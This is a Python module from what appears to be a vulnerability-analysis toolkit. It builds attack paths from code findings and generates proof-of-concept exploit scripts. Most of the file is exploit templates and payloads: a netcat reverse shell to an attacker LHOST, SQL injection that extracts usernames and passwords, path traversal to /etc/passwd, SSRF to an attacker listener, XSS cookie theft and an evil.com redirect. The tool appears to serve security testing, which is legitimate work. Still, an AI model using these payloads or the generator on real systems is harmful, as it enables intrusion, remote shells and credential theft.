#!/usr/bin/env python3
"""
Attack Path Generator for Code Vulnerability Analysis
=======================================================

Generates executable attack paths and PoC code from validated findings.

This module bridges the gap between vulnerability identification and
practical exploitation by:
1. Creating step-by-step attack sequences
2. Calculating authentication requirements across the full path
3. Generating executable PoC commands with placeholders

Usage:
    from attack_path import generate_attack_path, generate_poc, AttackPath
    from prioritize import TriageFinding, SinkType

    # Generate attack path
    path = generate_attack_path(finding, taint_path)

    # Generate proof of concept
    poc = generate_poc(path, finding.sink_type)
"""

from dataclasses import dataclass, field
from typing import List, Set, Optional, Dict
from enum import Enum

from prioritize import (
    TriageFinding,
    SinkType,
    CodeLocation,
    AuthLevel,
    InputProximity
)


@dataclass
class AttackStep:
    """A single step in an attack path."""
    step_num: int
    action: str
    location: str  # file:line or just file
    payload: Optional[str] = None
    auth_required: Optional[str] = None
    details: str = ""

    def to_dict(self) -> Dict:
        """Convert to dictionary for YAML serialization."""
        result = {
            "step": self.step_num,
            "action": self.action,
            "location": self.location,
        }
        if self.payload:
            result["payload"] = self.payload
        if self.auth_required:
            result["auth_required"] = self.auth_required
        if self.details:
            result["details"] = self.details
        return result


@dataclass
class AttackPath:
    """Complete attack path from entry to exploitation."""
    steps: List[AttackStep] = field(default_factory=list)
    total_auth_required: str = "none"
    complexity: str = "low"  # low, medium, high
    success_probability: float = 0.0  # 0.0-1.0

    def to_dict(self) -> Dict:
        """Convert to dictionary for YAML serialization."""
        return {
            "steps": [step.to_dict() for step in self.steps],
            "total_auth_required": self.total_auth_required,
            "complexity": self.complexity,
            "success_probability": round(self.success_probability, 2)
        }


# PoC template generators by vulnerability type
POC_TEMPLATES = {
    SinkType.CODE_EXECUTION: {
        "bash": """#!/bin/bash
# Remote Code Execution PoC
# Target: $TARGET
# Vulnerability: {vuln_desc}

TARGET="${{TARGET:-127.0.0.1}}"
LHOST="${{LHOST:-10.0.0.1}}"
LPORT="${{LPORT:-4444}}"
RPORT="${{RPORT:-80}}"

# Start listener (in another terminal)
# nc -lvnp $LPORT

# Send exploit
curl -X POST "http://$TARGET:$RPORT{endpoint}" \\
  -d "{param}={payload}" \\
  --data-urlencode

echo "[*] Exploit sent. Check listener for shell."
""",
        "python": """#!/usr/bin/env python3
# Remote Code Execution PoC
# Target: $TARGET
# Vulnerability: {vuln_desc}

import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
LHOST = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.1"
LPORT = sys.argv[3] if len(sys.argv) > 3 else "4444"
RPORT = sys.argv[4] if len(sys.argv) > 4 else "80"

# Start listener first: nc -lvnp $LPORT

url = f"http://{{{{TARGET}}}}:{{{{RPORT}}}}{endpoint}"
payload = "{payload}"

try:
    r = requests.post(url, data={{{{"{param}": payload}}}})
    print(f"[*] Status: {{{{r.status_code}}}}")
    print(f"[*] Check listener at {{{{LHOST}}}}:{{{{LPORT}}}}")
except Exception as e:
    print(f"[!] Error: {{{{e}}}}")
"""
    },
    SinkType.SQL: {
        "bash": """#!/bin/bash
# SQL Injection PoC
# Target: $TARGET
# Vulnerability: {vuln_desc}

TARGET="${{TARGET:-127.0.0.1}}"
RPORT="${{RPORT:-80}}"

# Test injection
echo "[*] Testing SQL injection..."
curl -v "http://$TARGET:$RPORT{endpoint}?{param}={payload}"

# Extract data
echo "[*] Extracting data..."
curl "http://$TARGET:$RPORT{endpoint}?{param}={data_exfil_payload}"
""",
        "python": """#!/usr/bin/env python3
# SQL Injection PoC
# Target: $TARGET
# Vulnerability: {vuln_desc}

import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
RPORT = sys.argv[2] if len(sys.argv) > 2 else "80"

url = f"http://{{{{TARGET}}}}:{{{{RPORT}}}}{endpoint}"

# Test injection
payloads = [
    "{payload}",
    "' OR '1'='1' --",
    "' UNION SELECT NULL,NULL,NULL--"
]

for payload in payloads:
    try:
        r = requests.get(url, params={{{{"{param}": payload}}}})
        print(f"[*] Payload: {{{{payload[:50]}}}}")
        print(f"[*] Status: {{{{r.status_code}}}}, Length: {{{{len(r.text)}}}}")
        if "error" not in r.text.lower():
            print(f"[+] Potential blind SQLi")
    except Exception as e:
        print(f"[!] Error: {{{{e}}}}")
"""
    },
    SinkType.FILE_OPS: {
        "bash": """#!/bin/bash
# Path Traversal / File Operation PoC
# Target: $TARGET
# Vulnerability: {vuln_desc}

TARGET="${{TARGET:-127.0.0.1}}"
RPORT="${{RPORT:-80}}"

# Test path traversal
echo "[*] Testing path traversal..."
curl "http://$TARGET:$RPORT{endpoint}?{param}={payload}"

# Try to read /etc/passwd
curl "http://$TARGET:$RPORT{endpoint}?{param}=../../../../etc/passwd"
""",
        "python": """#!/usr/bin/env python3
# Path Traversal / File Operation PoC
# Target: $TARGET
# Vulnerability: {vuln_desc}

import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
RPORT = sys.argv[2] if len(sys.argv) > 2 else "80"

url = f"http://{{{{TARGET}}}}:{{{{RPORT}}}}{endpoint}"

# Test various traversal depths
for depth in range(1, 8):
    payload = "../" * depth + "etc/passwd"
    try:
        r = requests.get(url, params={{{{"{param}": payload}}}})
        if "root:" in r.text:
            print(f"[+] Success at depth {{{{depth}}}}")
            print(r.text[:200])
            break
    except Exception as e:
        print(f"[!] Error: {{{{e}}}}")
"""
    },
    SinkType.XSS: {
        "bash": """#!/bin/bash
# Cross-Site Scripting (XSS) PoC
# Target: $TARGET
# Vulnerability: {vuln_desc}

TARGET="${{TARGET:-127.0.0.1}}"
RPORT="${{RPORT:-80}}"

# Test reflected XSS
PAYLOAD="{payload}"
curl "http://$TARGET:$RPORT{endpoint}?{param}=$PAYLOAD"

echo "[*] Check if script executed in browser"
echo "[*] URL: http://$TARGET:$RPORT{endpoint}?{param}=$PAYLOAD"
""",
        "python": """#!/usr/bin/env python3
# Cross-Site Scripting (XSS) PoC
# Target: $TARGET
# Vulnerability: {vuln_desc}

import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
RPORT = sys.argv[2] if len(sys.argv) > 2 else "80"

url = f"http://{{{{TARGET}}}}:{{{{RPORT}}}}{endpoint}"

payloads = [
    "{payload}",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
]

for payload in payloads:
    try:
        r = requests.get(url, params={{{{"{param}": payload}}}})
        if payload in r.text and "<script>" in r.text:
            print(f"[+] Reflected XSS confirmed")
            print(f"[*] Payload: {{{{payload}}}}")
            break
    except Exception as e:
        print(f"[!] Error: {{{{e}}}}")
"""
    },
    SinkType.SSRF: {
        "bash": """#!/bin/bash
# Server-Side Request Forgery (SSRF) PoC
# Target: $TARGET
# Vulnerability: {vuln_desc}

TARGET="${{TARGET:-127.0.0.1}}"
LHOST="${{LHOST:-10.0.0.1}}"
LPORT="${{LPORT:-8000}}"
RPORT="${{RPORT:-80}}"

# Start HTTP listener (in another terminal)
# python3 -m http.server $LPORT

# Trigger SSRF
curl "http://$TARGET:$RPORT{endpoint}?{param}=http://$LHOST:$LPORT/"

echo "[*] Check listener for incoming request"
""",
        "python": """#!/usr/bin/env python3
# Server-Side Request Forgery (SSRF) PoC
# Target: $TARGET
# Vulnerability: {vuln_desc}

import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
LHOST = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.1"
LPORT = sys.argv[3] if len(sys.argv) > 3 else "8000"
RPORT = sys.argv[4] if len(sys.argv) > 4 else "80"

# Start listener first: python3 -m http.server $LPORT

url = f"http://{{{{TARGET}}}}:{{{{RPORT}}}}{endpoint}"

# Try various SSRF targets
targets = [
    f"http://{{{{LHOST}}}}:{{{{LPORT}}}}/",
    "http://127.0.0.1:22/",
    "file:///etc/passwd"
]

for target in targets:
    try:
        r = requests.get(url, params={{{{"{param}": target}}}})
        print(f"[*] Target: {{{{target}}}}")
        print(f"[*] Status: {{{{r.status_code}}}}")
    except Exception as e:
        print(f"[!] Error: {{{{e}}}}")
"""
    }
}


def calculate_complexity(steps: List[AttackStep], auth_level: AuthLevel) -> str:
    """
    Calculate attack complexity based on step count and authentication.

    Args:
        steps: List of attack steps
        auth_level: Authentication requirement

    Returns:
        Complexity rating: "low", "medium", or "high"
    """
    step_count = len(steps)

    # Base complexity on authentication
    if auth_level in (AuthLevel.ADMIN, AuthLevel.STRONG):
        base = 2  # High
    elif auth_level in (AuthLevel.USER, AuthLevel.WEAK):
        base = 1  # Medium
    else:
        base = 0  # Low

    # Adjust for step count
    if step_count == 1:
        adjusted = base
    elif step_count <= 3:
        adjusted = base + 0.5
    else:
        adjusted = base + 1

    if adjusted >= 2:
        return "high"
    elif adjusted >= 1:
        return "medium"
    return "low"


def calculate_success_probability(
    finding: TriageFinding,
    step_count: int,
    complexity: str
) -> float:
    """
    Estimate probability of successful exploitation.

    Based on:
    - Input proximity (closer = higher)
    - Authentication level (none = higher)
    - Number of steps (fewer = higher)
    - Complexity (lower = higher)

    Args:
        finding: The vulnerability finding
        step_count: Number of steps in attack path
        complexity: Attack complexity rating

    Returns:
        Probability from 0.0 to 1.0
    """
    # Base probability from input proximity
    proximity_probs = {
        InputProximity.DIRECT: 0.9,
        InputProximity.SESSION: 0.7,
        InputProximity.DB_STORED: 0.6,
        InputProximity.CONFIG: 0.4,
        InputProximity.ENVIRONMENT: 0.3,
        InputProximity.HARDCODED: 0.1,
    }

    base_prob = proximity_probs.get(finding.input_proximity, 0.5)

    # Adjust for authentication
    auth_multipliers = {
        AuthLevel.NONE: 1.0,
        AuthLevel.WEAK: 0.8,
        AuthLevel.USER: 0.6,
        AuthLevel.ADMIN: 0.4,
        AuthLevel.STRONG: 0.2,
    }

    auth_mult = auth_multipliers.get(finding.auth_level, 0.5)

    # Adjust for complexity
    complexity_multipliers = {
        "low": 1.0,
        "medium": 0.8,
        "high": 0.6
    }

    complexity_mult = complexity_multipliers.get(complexity, 0.7)

    # Adjust for step count (more steps = more failure points)
    step_mult = max(0.5, 1.0 - (step_count - 1) * 0.1)

    # Final probability
    prob = base_prob * auth_mult * complexity_mult * step_mult

    return min(1.0, max(0.0, prob))


def generate_attack_path(
    finding: TriageFinding,
    taint_path: Set[str]
) -> AttackPath:
    """
    Generate step-by-step attack path from a finding and its taint analysis.

    Args:
        finding: The validated vulnerability finding
        taint_path: Set of file paths involved in the data flow

    Returns:
        Complete attack path with steps and metadata
    """
    steps: List[AttackStep] = []
    step_num = 1

    # Step 1: Entry point / Input injection
    entry_action = _generate_entry_action(finding)
    entry_location = f"{finding.location.file}:{finding.location.line}"
    entry_payload = _generate_entry_payload(finding)

    steps.append(AttackStep(
        step_num=step_num,
        action=entry_action,
        location=entry_location,
        payload=entry_payload,
        auth_required=finding.auth_level.value if finding.auth_level != AuthLevel.NONE else None,
        details=_generate_entry_details(finding)
    ))
    step_num += 1

    # Step 2+: Intermediate steps based on taint path complexity
    if len(taint_path) > 1:
        # Multi-file data flow - add traversal step
        steps.append(AttackStep(
            step_num=step_num,
            action="Data flows through application logic",
            location=f"{len(taint_path)} files in taint path",
            details=f"Input propagates through: {', '.join(sorted(taint_path)[:3])}"
        ))
        step_num += 1

    # Final step: Exploitation at sink
    sink_action = _generate_sink_action(finding)
    sink_location = entry_location  # Same as entry for now

    steps.append(AttackStep(
        step_num=step_num,
        action=sink_action,
        location=sink_location,
        details=f"Dangerous sink: {finding.sink_function}"
    ))

    # Calculate metadata
    complexity = calculate_complexity(steps, finding.auth_level)
    success_prob = calculate_success_probability(finding, len(steps), complexity)

    return AttackPath(
        steps=steps,
        total_auth_required=finding.auth_level.value,
        complexity=complexity,
        success_probability=success_prob
    )


def _generate_entry_action(finding: TriageFinding) -> str:
    """Generate human-readable action for entry point."""
    if finding.input_proximity == InputProximity.DIRECT:
        if "GET" in finding.input_source or "$_GET" in finding.input_source:
            return "Send GET request with malicious parameter"
        elif "POST" in finding.input_source or "$_POST" in finding.input_source:
            return "Send POST request with malicious payload"
        elif "request.args" in finding.input_source or "request.form" in finding.input_source:
            return "Send HTTP request with crafted input"
        else:
            return "Inject malicious input via user-controlled parameter"
    elif finding.input_proximity == InputProximity.SESSION:
        return "Poison session data with malicious value"
    elif finding.input_proximity == InputProximity.DB_STORED:
        return "Store malicious payload in database (second-order attack)"
    else:
        return "Inject malicious input"


def _generate_entry_payload(finding: TriageFinding) -> Optional[str]:
    """Generate example payload for entry point."""
    payload_map = {
        SinkType.CODE_EXECUTION: "; nc $LHOST $LPORT -e /bin/sh",
        SinkType.SQL: "' OR '1'='1' --",
        SinkType.FILE_OPS: "../../../../etc/passwd",
        SinkType.XSS: "<script>alert(document.cookie)</script>",
        SinkType.SSRF: "http://$LHOST:$LPORT/",
        SinkType.LDAP: "*)(uid=*",
        SinkType.XPATH: "' or '1'='1",
        SinkType.TEMPLATE: "{{7*7}}",
        SinkType.REDIRECT: "https://evil.com",
        SinkType.DESERIALIZATION: "O:8:\"stdClass\":0:{}",
    }

    return payload_map.get(finding.sink_type)


def _generate_entry_details(finding: TriageFinding) -> str:
    """Generate details for entry step."""
    details = []

    if finding.auth_level == AuthLevel.NONE:
        details.append("No authentication required")

    if finding.input_source:
        details.append(f"Input source: {finding.input_source}")

    return "; ".join(details) if details else ""


def _generate_sink_action(finding: TriageFinding) -> str:
    """Generate human-readable action for sink exploitation."""
    action_map = {
        SinkType.CODE_EXECUTION: "Execute arbitrary system commands",
        SinkType.SQL: "Execute SQL injection to extract/modify data",
        SinkType.FILE_OPS: "Read/write arbitrary files on the system",
        SinkType.XSS: "Execute JavaScript in victim's browser",
        SinkType.SSRF: "Force server to make requests to internal/external resources",
        SinkType.LDAP: "Bypass LDAP authentication or extract directory data",
        SinkType.XPATH: "Extract XML data via XPath injection",
        SinkType.TEMPLATE: "Execute code via template injection",
        SinkType.REDIRECT: "Redirect victim to malicious site",
        SinkType.DESERIALIZATION: "Execute code via unsafe deserialization",
    }

    return action_map.get(finding.sink_type, "Trigger vulnerability")


def generate_poc(
    path: AttackPath,
    vuln_type: SinkType,
    endpoint: str = "/vulnerable.php",
    param: str = "input",
    format: str = "bash"
) -> str:
    """
    Generate executable proof-of-concept code.

    Args:
        path: The attack path
        vuln_type: Type of vulnerability
        endpoint: Target endpoint path
        param: Vulnerable parameter name
        format: Output format ("bash" or "python")

    Returns:
        Executable PoC script with $TARGET, $LHOST, $LPORT, $RPORT placeholders
    """
    # Get template for this vulnerability type
    templates = POC_TEMPLATES.get(vuln_type)
    if not templates:
        # Fallback generic template
        return _generate_generic_poc(path, endpoint, param, format)

    template = templates.get(format, templates.get("bash", ""))

    # Extract payload from first step
    payload = ""
    for step in path.steps:
        if step.payload:
            payload = step.payload
            break

    # Build vulnerability description
    vuln_desc = f"{vuln_type.value} via {param} parameter"

    # Fill in template
    poc = template.format(
        vuln_desc=vuln_desc,
        endpoint=endpoint,
        param=param,
        payload=payload or "PAYLOAD_HERE",
        data_exfil_payload=f"' UNION SELECT username,password FROM users--"
    )

    return poc


def _generate_generic_poc(
    path: AttackPath,
    endpoint: str,
    param: str,
    format: str
) -> str:
    """Generate generic PoC when no specific template exists."""
    if format == "python":
        return f"""#!/usr/bin/env python3
# Generic PoC
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
RPORT = sys.argv[2] if len(sys.argv) > 2 else "80"

url = f"http://{{{{TARGET}}}}:{{{{RPORT}}}}{endpoint}"
payload = "PAYLOAD_HERE"

r = requests.get(url, params={{{{"{param}": payload}}}})
print(f"Status: {{{{r.status_code}}}}")
print(r.text[:500])
"""
    else:
        return f"""#!/bin/bash
# Generic PoC
TARGET="${{TARGET:-127.0.0.1}}"
RPORT="${{RPORT:-80}}"

curl "http://$TARGET:$RPORT{endpoint}?{param}=PAYLOAD_HERE"
"""


if __name__ == "__main__":
    # Demo: Generate attack path for example finding
    from prioritize import TriageFinding, CodeLocation, SinkType, InputProximity, AuthLevel

    # Example: RCE via system() call
    finding = TriageFinding(
        id="VULN-001",
        location=CodeLocation(
            file="admin/execute.php",
            line=42,
            function="exec_command",
            context="system($_GET['cmd']);"
        ),
        sink_type=SinkType.CODE_EXECUTION,
        sink_function="system",
        input_proximity=InputProximity.DIRECT,
        input_source="$_GET['cmd']",
        auth_level=AuthLevel.NONE,
        description="Unauthenticated RCE via system() with direct GET input",
        confidence=0.95
    )

    taint_path = {"admin/execute.php", "admin/common.php"}

    # Generate attack path
    attack_path = generate_attack_path(finding, taint_path)

    print("Attack Path Demo")
    print("=" * 60)
    print(f"Total Auth Required: {attack_path.total_auth_required}")
    print(f"Complexity: {attack_path.complexity}")
    print(f"Success Probability: {attack_path.success_probability:.0%}")
    print("\nSteps:")
    for step in attack_path.steps:
        print(f"\n  Step {step.step_num}: {step.action}")
        print(f"    Location: {step.location}")
        if step.payload:
            print(f"    Payload: {step.payload}")
        if step.details:
            print(f"    Details: {step.details}")

    # Generate PoC
    print("\n" + "=" * 60)
    print("Proof of Concept (Bash):")
    print("=" * 60)
    poc_bash = generate_poc(attack_path, finding.sink_type, "/admin/execute.php", "cmd", "bash")
    print(poc_bash)

    print("\n" + "=" * 60)
    print("Proof of Concept (Python):")
    print("=" * 60)
    poc_python = generate_poc(attack_path, finding.sink_type, "/admin/execute.php", "cmd", "python")
    print(poc_python)
